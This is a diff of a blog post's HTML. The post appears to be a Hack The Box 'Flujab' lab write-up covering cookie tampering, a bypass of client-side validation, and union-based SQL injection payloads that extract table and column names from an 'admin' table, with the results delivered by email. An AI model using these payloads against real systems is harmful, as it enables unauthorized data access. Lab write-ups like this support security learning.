-<h4 id="that-one-is-interesting-i-tried-to-run-gobuster-but-there-was-a-wildcard-response-when-i-checked-manually-i-found-that-instead-of-responding-with-404-it-responds-with-a-redirection-to-httpsclownwarehtbcwerror_pagesphp-which-has-a-gif-of-a-strange-creepy-clown-">That one is interesting. I tried to run <code class="highlighter-rouge">gobuster</code> but there was a wildcard response. When I checked manually I found that instead of responding with <code class="highlighter-rouge">404</code> it responds with a redirection to <code class="highlighter-rouge">https://clownware.htb/cwerror_pages.php</code> which has a <code class="highlighter-rouge">gif</code> of a strange creepy clown …</h4>
-<h4 id="note--i-checked-them-all-on-port-8080-too-but-i-always-got-the-direct-ip-access-error">Note : I checked them all on port 8080 too but I always got the direct ip access error.</h4>
-<h4 id="i-started-burp-and-configured-the-scope-">I started <code class="highlighter-rouge">burp</code> and configured the scope :</h4>
-<p><img src="/images/hackthebox/flujab/15.png" alt="" />
+<img src="/images/hackthebox/flujab/14.png" alt="" />
+<br /> That one is interesting. I tried to run <code class="highlighter-rouge">gobuster</code> but there was a wildcard response. When I checked manually I found that instead of responding with <code class="highlighter-rouge">404</code> it responds with a redirection to <code class="highlighter-rouge">https://clownware.htb/cwerror_pages.php</code> which has a <code class="highlighter-rouge">gif</code> of a strange creepy clown …
+<br /> Note : I checked them all on port 8080 too but I always got the direct ip access error.
+<br /> I started <code class="highlighter-rouge">burp</code> and configured the scope :
+<img src="/images/hackthebox/flujab/15.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/flujab/16.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/17.png" alt="" /></p>
-<h4 id="then-i-ran-the-spider-">Then I ran the spider :</h4>
-<p><img src="/images/hackthebox/flujab/18.png" alt="" /></p>
-<h4 id="results-">Results :</h4>
-<p><img src="/images/hackthebox/flujab/19.png" alt="" />
+<img src="/images/hackthebox/flujab/17.png" alt="" />
+<br /> Then I ran the spider :
+<img src="/images/hackthebox/flujab/18.png" alt="" />
+<br /> Results :
+<img src="/images/hackthebox/flujab/19.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/flujab/20.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/21.png" alt="" /></p>
-<h4 id="i-checked-the-requests-and-the-responses-of-different-pages-and-actions-i-noticed-in-one-of-the-responses-a-set-cookie-header-that-sets-a-cookie-called-modus-and-sets-the-path-for-it-to-smtp_config">I checked the requests and the responses of different pages and actions. I noticed in one of the responses a <code class="highlighter-rouge">Set-Cookie</code> header that sets a cookie called <code class="highlighter-rouge">Modus</code> and sets the path for it to <code class="highlighter-rouge">/?smtp_config</code>.</h4>
-<p><img src="/images/hackthebox/flujab/22.png" alt="" /></p>
-<h4 id="i-requested-smtp_config-in-the-browser-and-looked-at-the-request-in-burp-">I requested <code class="highlighter-rouge">/?smtp_config</code> in the browser and looked at the request in <code class="highlighter-rouge">burp</code> :</h4>
-<h4 id="request-">Request :</h4>
-<p><img src="/images/hackthebox/flujab/23.png" alt="" /></p>
-<h4 id="response-">Response :</h4>
-<p><img src="/images/hackthebox/flujab/24.png" alt="" /></p>
-<h4 id="the-response-was-a-redirection-to-denied-we-are-sending-3-cookies-in-every-request--modus--patient-and-registered-modus-and-registered-are-base-64-encoded-strings-while-patient-is-an-md5-hash">The response was a redirection to <code class="highlighter-rouge">/?denied</code>. We are sending 3 cookies in every request : <code class="highlighter-rouge">Modus</code> , <code class="highlighter-rouge">Patient</code> and <code class="highlighter-rouge">Registered</code>. <code class="highlighter-rouge">Modus</code> and <code class="highlighter-rouge">Registered</code> are <code class="highlighter-rouge">base-64</code> encoded strings while <code class="highlighter-rouge">Patient</code> is an <code class="highlighter-rouge">md5</code> hash.</h4>
-<p><img src="/images/hackthebox/flujab/25.png" alt="" /></p>
-<h4 id="modus--configurenull"><code class="highlighter-rouge">Modus</code> = <code class="highlighter-rouge">Configure=Null</code></h4>
-<h4 id="registered---f991b5fb6a2939471c7230b2db78225enull"><code class="highlighter-rouge">Registered</code>  = <code class="highlighter-rouge">f991b5fb6a2939471c7230b2db78225e=Null</code></h4>
-<h4 id="registered-is-using-the-same-hash-from-patient-after-some-guesses-i-found-that-this-hash-is-for-my-ip-"><code class="highlighter-rouge">Registered</code> is using the same hash from <code class="highlighter-rouge">Patient</code>, After some guesses I found that this hash is for my ip :</h4>
-<p><img src="/images/hackthebox/flujab/26.png" alt="" /></p>
-<h4 id="anyway-we-can-try-to-change-these-values-from-null-to-true-and-see-what-happens-">Anyway we can try to change these values from <code class="highlighter-rouge">Null</code> to <code class="highlighter-rouge">True</code> and see what happens :</h4>
-<p><img src="/images/hackthebox/flujab/27.png" alt="" />
+<img src="/images/hackthebox/flujab/21.png" alt="" />
+<br /> I checked the requests and the responses of different pages and actions. I noticed in one of the responses a <code class="highlighter-rouge">Set-Cookie</code> header that sets a cookie called <code class="highlighter-rouge">Modus</code> and sets the path for it to <code class="highlighter-rouge">/?smtp_config</code>.
+<img src="/images/hackthebox/flujab/22.png" alt="" />
+<br /> I requested <code class="highlighter-rouge">/?smtp_config</code> in the browser and looked at the request in <code class="highlighter-rouge">burp</code> :
+<br /> Request :
+<img src="/images/hackthebox/flujab/23.png" alt="" />
+<br /> Response :
+<img src="/images/hackthebox/flujab/24.png" alt="" />
+<br /> The response was a redirection to <code class="highlighter-rouge">/?denied</code>. We are sending 3 cookies in every request : <code class="highlighter-rouge">Modus</code> , <code class="highlighter-rouge">Patient</code> and <code class="highlighter-rouge">Registered</code>. <code class="highlighter-rouge">Modus</code> and <code class="highlighter-rouge">Registered</code> are <code class="highlighter-rouge">base-64</code> encoded strings while <code class="highlighter-rouge">Patient</code> is an <code class="highlighter-rouge">md5</code> hash.
+<img src="/images/hackthebox/flujab/25.png" alt="" />
+<br /> <code class="highlighter-rouge">Modus</code> = <code class="highlighter-rouge">Configure=Null</code>
+<br /> <code class="highlighter-rouge">Registered</code>  = <code class="highlighter-rouge">f991b5fb6a2939471c7230b2db78225e=Null</code>
+<br /> <code class="highlighter-rouge">Registered</code> is using the same hash from <code class="highlighter-rouge">Patient</code>, After some guesses I found that this hash is for my ip :
+<img src="/images/hackthebox/flujab/26.png" alt="" />
+<br /> Anyway we can try to change these values from <code class="highlighter-rouge">Null</code> to <code class="highlighter-rouge">True</code> and see what happens :
+<img src="/images/hackthebox/flujab/27.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/28.png" alt="" /></p>
-<h4 id="request--1">Request :</h4>
-<p><img src="/images/hackthebox/flujab/29.png" alt="" /></p>
+<img src="/images/hackthebox/flujab/28.png" alt="" />
+<br /> Request :
+<img src="/images/hackthebox/flujab/29.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?smtp_config HTTP/1.1
 Host: freeflujab.htb
 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -179,8 +182,8 @@ Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; 
 Connection: close
 Upgrade-Insecure-Requests: 1
 </code></pre></div></div>
-<h4 id="response--1">Response :</h4>
-<p><img src="/images/hackthebox/flujab/30.png" alt="" /></p>
+<p><br /> Response :
+<img src="/images/hackthebox/flujab/30.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Date: Thu, 15 Jun 2019 10:34:17 GMT
 Content-Type: text/html; charset=UTF-8
@@ -188,25 +191,25 @@ Connection: close
 Server: ClownWare Proxy
 Content-Length: 3735
 </code></pre></div></div>
-<h4 id="great-we-can-access-the-page-now">Great, we can access the page now.</h4>
-<p><img src="/images/hackthebox/flujab/31.png" alt="" /></p>
-<h4 id="before-doing-anything-i-noticed-this-message-about-the-whitelist">Before doing anything I noticed this message about the whitelist:</h4>
-<p><img src="/images/hackthebox/flujab/32.png" alt="" />
+<p><br /> Great, we can access the page now. 
+<img src="/images/hackthebox/flujab/31.png" alt="" />
+<br /> Before doing anything I noticed this message about the whitelist:
+<img src="/images/hackthebox/flujab/32.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/33.png" alt="" /></p>
-<h4 id="i-requested-whitelist-and-looked-at-the-response-">I requested <code class="highlighter-rouge">/?whitelist</code> and looked at the response :</h4>
-<p><img src="/images/hackthebox/flujab/34.png" alt="" />
+<img src="/images/hackthebox/flujab/33.png" alt="" />
+<br /> I requested <code class="highlighter-rouge">/?whitelist</code> and looked at the response :
+<img src="/images/hackthebox/flujab/34.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/35.png" alt="" /></p>
-<h4 id="my-ip-wasnt-there-anyway-i-used-python-to-run-a-debugging-smtp-server-">My ip wasn’t there. Anyway I used python to run a debugging <code class="highlighter-rouge">smtp</code> server :</h4>
-<p><code class="highlighter-rouge">python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25</code>
-<img src="/images/hackthebox/flujab/36.png" alt="" /></p>
-<h4 id="then-i-went-to-update-the-smtp-settings-and-add-mine-">Then I went to update the <code class="highlighter-rouge">smtp</code> settings and add mine :</h4>
-<p><img src="/images/hackthebox/flujab/37.png" alt="" /></p>
-<h4 id="but-i-got-this-message--a-valid-smtp-domain-address-is-required-so-i-checked-the-source-of-the-form-">But I got this message : <code class="highlighter-rouge">A Valid SMTP Domain Address Is Required</code>. So I checked the source of the form :</h4>
-<p><img src="/images/hackthebox/flujab/38.png" alt="" /></p>
+<img src="/images/hackthebox/flujab/35.png" alt="" />
+<br /> My ip wasn’t there. Anyway I used python to run a debugging <code class="highlighter-rouge">smtp</code> server :
+<code class="highlighter-rouge">python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25</code>
+<img src="/images/hackthebox/flujab/36.png" alt="" />
+<br /> Then I went to update the <code class="highlighter-rouge">smtp</code> settings and add mine :
+<img src="/images/hackthebox/flujab/37.png" alt="" />
+<br /> But I got this message : <code class="highlighter-rouge">A Valid SMTP Domain Address Is Required</code>. So I checked the source of the form :
+<img src="/images/hackthebox/flujab/38.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form method="post" action="?smtp_config"&gt;
 	&lt;div class="row aln-center"&gt;
 		&lt;div class="col-6 "&gt;
@@ -227,11 +230,11 @@ Content-Length: 3735
 	&lt;/div&gt;
 &lt;/form&gt;
 </code></pre></div></div>
-<h4 id="its-relying-on-client-side-validation-check-">It’s relying on client-side validation check :</h4>
-<p><img src="/images/hackthebox/flujab/39.png" alt="" /></p>
-<h4 id="which-means-that-we-can-bypass-it-easily-by-sending-the-data-directly-in-the-request-">Which means that we can bypass it easily by sending the data directly in the request :</h4>
-<h4 id="request--2">Request :</h4>
-<p><img src="/images/hackthebox/flujab/40.png" alt="" /></p>
+<p><br /> It’s relying on client-side validation check : 
+<img src="/images/hackthebox/flujab/39.png" alt="" />
+<br /> Which means that we can bypass it easily by sending the data directly in the request :
+<br /> Request :
+<img src="/images/hackthebox/flujab/40.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?smtp_config HTTP/1.1
 Host: freeflujab.htb
 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -249,17 +252,17 @@ mailserver=10.10.xx.xx&amp;port=25&amp;save=Save+Mail+Server+Config
 <p><img src="/images/hackthebox/flujab/41.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/42.png" alt="" /></p>
-<h4 id="note--i-checked-whitelist-again-and-my-ip-was-added-there-after-i-added-it-in-the-smtp-server-configuration">Note : I checked <code class="highlighter-rouge">/?whitelist</code> again and my ip was added there after I added it in the <code class="highlighter-rouge">smtp</code> server configuration</h4>
-<h4 id="in-the-patients-section-there-were-some-pages-to-book-an-appointment-book-send-a-reminder-remind-or-to-cancel-an-appointment-cancel-to-book-an-appointment-we-need-a-valid-patients-name-after-some-enumeration-i-found-some-names-in-info-">In the patients section there were some pages to book an appointment (<code class="highlighter-rouge">/?book</code>), send a reminder (<code class="highlighter-rouge">/?remind</code>) or to cancel an appointment (<code class="highlighter-rouge">/?cancel</code>). To book an appointment we need a valid patient’s name. After some enumeration I found some names in <code class="highlighter-rouge">/?info</code> :</h4>
-<p><img src="/images/hackthebox/flujab/43.png" alt="" /></p>
-<h4 id="i-took-b-smith-and-after-some-guesses-i-got-the-right-name-which-was-bob-smith-">I took B. Smith and after some guesses I got the right name which was Bob Smith :</h4>
-<p><img src="/images/hackthebox/flujab/44.png" alt="" />
+<img src="/images/hackthebox/flujab/42.png" alt="" />
+<br /> Note : I checked <code class="highlighter-rouge">/?whitelist</code> again and my ip was added there after I added it in the <code class="highlighter-rouge">smtp</code> server configuration
+<br /> In the patients section there were some pages to book an appointment (<code class="highlighter-rouge">/?book</code>), send a reminder (<code class="highlighter-rouge">/?remind</code>) or to cancel an appointment (<code class="highlighter-rouge">/?cancel</code>). To book an appointment we need a valid patient’s name. After some enumeration I found some names in <code class="highlighter-rouge">/?info</code> :
+<img src="/images/hackthebox/flujab/43.png" alt="" />
+<br /> I took B. Smith and after some guesses I got the right name which was Bob Smith :
+<img src="/images/hackthebox/flujab/44.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/45.png" alt="" /></p>
-<h4 id="the-email-was-sent-and-we-can-see-that-in-the-python-smtp-server-">The email was sent and we can see that in the python <code class="highlighter-rouge">smtp</code> server :</h4>
-<p><img src="/images/hackthebox/flujab/46.png" alt="" /></p>
+<img src="/images/hackthebox/flujab/45.png" alt="" />
+<br /> The email was sent and we can see that in the python <code class="highlighter-rouge">smtp</code> server :
+<img src="/images/hackthebox/flujab/46.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------                                                                                                       
 Date: Thu, 13 Jun 2019 14:47:23 +0100                                                                                                       
 To: bobsmith1975@gmail.com                                                                                                                  
@@ -300,9 +303,9 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="i-tried-to-go-to-cancel-">I tried to go to <code class="highlighter-rouge">/?cancel</code> :</h4>
-<h4 id="request--3">Request :</h4>
-<p><img src="/images/hackthebox/flujab/47.png" alt="" /></p>
+<p><br /> I tried to go to <code class="highlighter-rouge">/?cancel</code> :
+<br /> Request :
+<img src="/images/hackthebox/flujab/47.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?cancel HTTP/1.1
 Host: freeflujab.htb
 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -313,8 +316,8 @@ Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; 
 Connection: close
 Upgrade-Insecure-Requests: 1
 </code></pre></div></div>
-<h4 id="response--2">Response :</h4>
-<p><img src="/images/hackthebox/flujab/48.png" alt="" /></p>
+<p><br /> Response :
+<img src="/images/hackthebox/flujab/48.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 HTTP/1.1 302 Found
 Date: Thu, 13 Jun 2019 13:50:05 GMT
@@ -324,11 +327,11 @@ Location: /?ERROR=NOT_REGISTERED
 Server: ClownWare Proxy
 Content-Length: 2060
 </code></pre></div></div>
-<h4 id="it-redirected-me-to-errornot_registered-i-looked-at-the-older-requests-and-i-noticed-the-set-cookie-headers-">It redirected me to <code class="highlighter-rouge">/?ERROR=NOT_REGISTERED</code>. I looked at the older requests and I noticed the <code class="highlighter-rouge">Set-Cookie</code> headers :</h4>
-<p><img src="/images/hackthebox/flujab/49.png" alt="" /></p>
-<h4 id="so-i-added-the-info-about-expiration-max-age-and-path-to-my-cookies-and-tried-again-">So I added the info about expiration, max age and path to my cookies and tried again :</h4>
-<h4 id="request--4">Request :</h4>
-<p><img src="/images/hackthebox/flujab/50.png" alt="" /></p>
+<p><br /> It redirected me to <code class="highlighter-rouge">/?ERROR=NOT_REGISTERED</code>. I looked at the older requests and I noticed the <code class="highlighter-rouge">Set-Cookie</code> headers :
+<img src="/images/hackthebox/flujab/49.png" alt="" />
+<br /> So I added the info about expiration, max age and path to my cookies and tried again :
+<br /> Request :
+<img src="/images/hackthebox/flujab/50.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?cancel HTTP/1.1
 Host: freeflujab.htb
 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -339,8 +342,8 @@ Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max
 Connection: close
 Upgrade-Insecure-Requests: 1
 </code></pre></div></div>
-<h4 id="response--3">Response :</h4>
-<p><img src="/images/hackthebox/flujab/51.png" alt="" /></p>
+<p><br /> Response :
+<img src="/images/hackthebox/flujab/51.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Date: Thu, 13 Jun 2019 13:58:23 GMT
 Content-Type: text/html; charset=UTF-8
@@ -351,16 +354,16 @@ Content-Length: 5128
 <p><img src="/images/hackthebox/flujab/52.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/53.png" alt="" /></p>
-<h4 id="to-cancel-an-appointment-we-need-to-provide-the-nhs-number-of-the-patient-however-like-on-the-smtp-configuration-page-it-used-client-side-validation-check-">To cancel an appointment we need to provide the NHS number of the patient. However like on the <code class="highlighter-rouge">smtp</code> configuration page it used client-side validation check :</h4>
-<p><img src="/images/hackthebox/flujab/54.png" alt="" /></p>
+<img src="/images/hackthebox/flujab/53.png" alt="" />
+<br /> To cancel an appointment we need to provide the NHS number of the patient. However like on the <code class="highlighter-rouge">smtp</code> configuration page it used client-side validation check :
+<img src="/images/hackthebox/flujab/54.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input type="text" name="nhsnum" placeholder="NHS Number Required" pattern="NHS-\d{3}-\d{3}-\d{4}" title=" A Valid NHS Number Is Required e.g. NHS-012-345-6789" required&gt;&lt;/br&gt;
   &lt;ul class="actions"&gt;
     &lt;center&gt;&lt;input type="submit" class="style1" value="Cancel Appointment" name="submit" /&gt;&lt;/center&gt;
 </code></pre></div></div>
-<p><img src="/images/hackthebox/flujab/55.png" alt="" /></p>
-<h4 id="request--5">Request :</h4>
-<p><img src="/images/hackthebox/flujab/56.png" alt="" /></p>
+<p><img src="/images/hackthebox/flujab/55.png" alt="" />
+<br /> Request :
+<img src="/images/hackthebox/flujab/56.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?cancel HTTP/1.1
 Host: freeflujab.htb
 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -376,8 +379,8 @@ Upgrade-Insecure-Requests: 1
 
 nhsnum=test&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="response--4">Response :</h4>
-<p><img src="/images/hackthebox/flujab/57.png" alt="" /></p>
+<p><br /> Response :
+<img src="/images/hackthebox/flujab/57.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Date: Thu, 13 Jun 2019 14:13:42 GMT
 Content-Type: text/html; charset=UTF-8
@@ -385,8 +388,8 @@ Connection: close
 Server: ClownWare Proxy
 Content-Length: 5204
 </code></pre></div></div>
-<h4 id="now-if-we-check-the-smtp-server-we-can-see-that-the-cancellation-email-was-sent-successfully-">Now if we check the <code class="highlighter-rouge">smtp</code> server we can see that the cancellation email was sent successfully :</h4>
-<p><img src="/images/hackthebox/flujab/58.png" alt="" /></p>
+<p><br /> Now if we check the <code class="highlighter-rouge">smtp</code> server we can see that the cancellation email was sent successfully :
+<img src="/images/hackthebox/flujab/58.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:13:40 +0100
 To: cancelations@no-reply.flujab.htb
@@ -425,14 +428,14 @@ X-Peer: 10.10.10.124
 <p><br /></p>
 <hr />
 
-<h3 id="sqli">SQLi</h3>
-<h4 id="i-tried-to-play-around-with-that-input-nhsnum-i-tried-a-lot-of-stuff-and-when-i-tried-union-based-sql-injection-i-got-a-hit-a-good-reference">I tried to play around with that input (<code class="highlighter-rouge">nhsnum</code>), I tried a lot of stuff and when I tried union based <code class="highlighter-rouge">sql</code> injection I got a hit (a good <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html">reference</a>):</h4>
-<p><img src="/images/hackthebox/flujab/59.png" alt="" /></p>
+<h2 id="sqli">SQLi</h2>
+<p><br /> I tried to play around with that input (<code class="highlighter-rouge">nhsnum</code>), I tried a lot of stuff and when I tried union based <code class="highlighter-rouge">sql</code> injection I got a hit (a good <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html">reference</a>):
+<img src="/images/hackthebox/flujab/59.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,@@datadir,4,5;#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="this-payload-prints-the-data-directory">This payload prints the data directory.</h4>
-<h4 id="smtp-"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/60.png" alt="" /></p>
+<p><br /> This payload prints the data directory.
+<br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/60.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:20:32 +0100
 To: cancelations@no-reply.flujab.htb
@@ -468,12 +471,12 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="database-version-">Database version :</h4>
-<p><img src="/images/hackthebox/flujab/61.png" alt="" /></p>
+<p><br /> Database version :
+<img src="/images/hackthebox/flujab/61.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,@@version,4,5;#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--1"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/62.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/62.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:24:50 +0100
 To: cancelations@no-reply.flujab.htb
@@ -509,12 +512,12 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="great-lets-get-the-table-name-">Great. Let’s get the table name :</h4>
-<p><img src="/images/hackthebox/flujab/63.png" alt="" /></p>
+<p><br /> Great. Let’s get the table name :
+<img src="/images/hackthebox/flujab/63.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--2"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/64.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/64.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:28:15 +0100
 To: cancelations@no-reply.flujab.htb
@@ -550,12 +553,12 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="table-name-is-admin-lets-get-the-column-names-">Table name is <code class="highlighter-rouge">admin</code> let’s get the column names :</h4>
-<p><img src="/images/hackthebox/flujab/65.png" alt="" /></p>
+<p><br /> Table name is <code class="highlighter-rouge">admin</code> let’s get the column names :
+<img src="/images/hackthebox/flujab/65.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--3"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/66.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/66.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:38:55 +0100
 To: cancelations@no-reply.flujab.htb
@@ -591,12 +594,12 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="this-gave-us-the-first-column-name-which-is-id-to-get-the-rest-of-the-column-names-we-will-add-and-column_nameprevious-column-name-here">This gave us the first column name which is <code class="highlighter-rouge">id</code>, to get the rest of the column names we will add <code class="highlighter-rouge">and column_name!='PREVIOUS COLUMN NAME HERE'</code>.</h4>
-<p><img src="/images/hackthebox/flujab/67.png" alt="" /></p>
+<p><br /> This gave us the first column name which is <code class="highlighter-rouge">id</code>, to get the rest of the column names we will add <code class="highlighter-rouge">and column_name!='PREVIOUS COLUMN NAME HERE'</code>.
+<img src="/images/hackthebox/flujab/67.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--4"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/68.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/68.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:41:26 +0100
 To: cancelations@no-reply.flujab.htb
@@ -632,12 +635,12 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="second-column--loginname">Second column : <code class="highlighter-rouge">loginname</code></h4>
-<p><img src="/images/hackthebox/flujab/69.png" alt="" /></p>
+<p><br /> Second column : <code class="highlighter-rouge">loginname</code>
+<img src="/images/hackthebox/flujab/69.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--5"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/70.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/70.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:44:08 +0100
 To: cancelations@no-reply.flujab.htb
@@ -673,12 +676,12 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="third-column--namelc">Third column : <code class="highlighter-rouge">namelc</code></h4>
-<p><img src="/images/hackthebox/flujab/71.png" alt="" /></p>
+<p><br /> Third column : <code class="highlighter-rouge">namelc</code>
+<img src="/images/hackthebox/flujab/71.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nhsnum=' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
 </code></pre></div></div>
-<h4 id="smtp--6"><code class="highlighter-rouge">smtp</code> :</h4>
-<p><img src="/images/hackthebox/flujab/72.png" alt="" /></p>
+<p><br /> <code class="highlighter-rouge">smtp</code> :
+<img src="/images/hackthebox/flujab/72.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
 Date: Thu, 13 Jun 2019 15:46:45 +0100
 To: cancelations@no-reply.flujab.htb
@@ -714,12 +717,12 @@ X-Peer: 10.10.10.124
 
 ------------ END MESSAGE ------------
 </code></pre></div></div>
-<h4 id="fourth-column--email">Fourth column : <code class="highlighter-rouge">email</code></h4>
-<p><img src="/images/hackthebox/flujab/73.png" alt="" /></p>
+<p><br /> Fourth column : <code class="highlighter-rouge">email</code>
+<img src="/images/hackthebox/flujab/73.png" alt="" /></p>
